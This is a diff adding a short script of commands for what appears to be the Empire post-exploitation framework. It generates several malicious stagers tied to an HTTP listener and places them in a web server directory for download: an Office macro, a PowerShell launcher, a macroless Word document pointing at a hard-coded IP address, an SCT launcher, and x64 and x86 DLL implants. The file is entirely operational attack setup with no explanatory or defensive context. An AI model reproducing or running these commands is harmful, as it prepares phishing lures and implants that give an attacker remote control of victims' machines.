@@ -1,0 +1,32 @@
+listeners
+usestager windows/macro
+set Listener http4433
+set OutFile /var/www/html/macro
+execute
+back
+usestager multi/launcher
+set Listener http4433
+set OutFile /var/www/html/http4433.ps1
+execute
+back
+usestager windows/macroless_word
+set Listener http4433
+set OutputPath /var/www/html/
+set HostURL http://206.81.4.44:80
+set OutputDocx http4433.docx
+execute
+back
+usestager windows/launcher_sct
+set Listener http4433
+set OutFile /var/www/html/http4433.sct
+execute
+back
+usestager windows/dll
+set Listener http4433
+set OutFile /var/www/html/http4433.x64.dll
+set Arch x64
+execute
+set Arch x86
+set OutFile /var/www/html/http4433.x86.dll
+execute
+back
